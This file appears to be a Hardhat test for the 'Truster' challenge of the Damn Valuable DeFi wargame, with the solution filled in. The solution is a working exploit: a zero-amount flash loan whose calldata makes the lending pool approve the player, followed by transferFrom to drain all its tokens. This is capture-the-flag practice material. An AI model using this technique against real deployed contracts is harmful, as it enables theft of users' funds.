const { ethers } = require("hardhat");
const { expect } = require("chai");
const { toUtf8Bytes } = require("ethers/lib/utils");

describe("[Challenge] Truster", function () {
  let deployer, player;
  let token, pool;

  const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player] = await ethers.getSigners();

    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();
    pool = await (
      await ethers.getContractFactory("TrusterLenderPool", deployer)
    ).deploy(token.address);
    expect(await pool.token()).to.eq(token.address);

    await token.transfer(pool.address, TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

    expect(await token.balanceOf(player.address)).to.equal(0);
  });

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */

    // get the abi encoded data for approve(player,amount)
    const abiEncode = ethers.utils.defaultAbiCoder.encode(
      ["address", "uint256"],
      [player.address, ethers.constants.MaxUint256]
    );

    const functionHash = ethers.utils
      .keccak256(toUtf8Bytes("approve(address,uint256)"))
      .slice(0, 10);
    const calldata = functionHash + abiEncode.slice(2);
    console.log(calldata);
    const loanTx = await pool
      .connect(player)
      .flashLoan(0, player.address, token.address, calldata);
    await loanTx.wait();
    const useFundsTx = await token
      .connect(player)
      .transferFrom(pool.address, player.address, TOKENS_IN_POOL);
    await useFundsTx.wait();
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // Player has taken all tokens from the pool
    expect(await token.balanceOf(player.address)).to.equal(TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.equal(0);
  });
});
